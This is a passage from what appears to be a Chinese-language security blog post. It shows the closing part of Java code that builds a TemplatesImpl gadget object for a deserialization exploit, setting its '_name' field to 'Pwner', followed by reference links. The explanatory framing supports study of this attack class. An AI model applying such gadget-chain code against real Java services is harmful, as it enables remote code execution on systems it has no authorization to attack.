            <span class="n">classBytes</span><span class="o">,</span> <span class="n">ClassFiles</span><span class="o">.</span><span class="na">classAsBytes</span><span class="o">(</span><span class="n">Foo</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
    <span class="o">});</span>
    <span class="c1">// 使用 Reflections 反射框架为 _name 字段赋值</span>
    <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"Pwner"</span><span class="o">);</span>

    <span class="k">return</span> <span class="n">templates</span><span class="o">;</span>
<span class="o">}</span>


<span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Foo</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">8207363842866235160L</span><span class="o">;</span>
<span class="o">}</span>

<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="ad6faced1313cf5bca4e6ff9abf7f468"><strong>参考</strong></h2>
<p><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3" target="_blank">https://gist.github.com/frohoff/24af7913611f8406eaf3</a></p>
<p><a href="https://sec.xiaomi.com/article/41" target="_blank">https://sec.xiaomi.com/article/41</a></p>
</div>
</div>